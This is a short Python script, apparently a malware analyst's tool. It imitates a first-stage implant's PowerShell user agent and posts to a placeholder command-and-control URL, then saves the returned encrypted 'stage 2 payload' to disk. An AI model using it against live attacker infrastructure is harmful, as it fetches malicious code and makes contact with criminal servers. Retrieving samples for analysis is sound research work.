import requests
import random
import urllib3


def main():
    c2_url = "<C2 URL HERE>"
    # Note, will need to update this user agent to what you find in the first stage
    user_agent = "Mozilla/5.0 (Windows NT; Windows NT 10.0;) WindowsPowerShell/5.1  (VuMUAsryhPLsaqGXlSx)"

    headers = {
        'User-Agent' : user_agent,
        'Content-type' : 'application/x-www-form-urlencoded',
        'Cache-Control' : 'no-cache',
        'Accept-Encoding' : urllib3.util.SKIP_HEADER,
        'Accept' : None,
        'Connection': None
    }
    print(f"Sending headers: {headers} to the C2 URL: {c2_url}")
    resp = requests.post(c2_url, headers=headers)
    print(f"Status Code: {resp.status_code}")

    if len(resp.content) > 0:

        with open("encrypted_payload.bin", "wb") as f:
            f.write(resp.content)
        
        print("Successfully downloaded stage 2 payload.")
    else:
        print("Failed to acquire stage 2 from C2.")

if __name__ == "__main__":
    main()
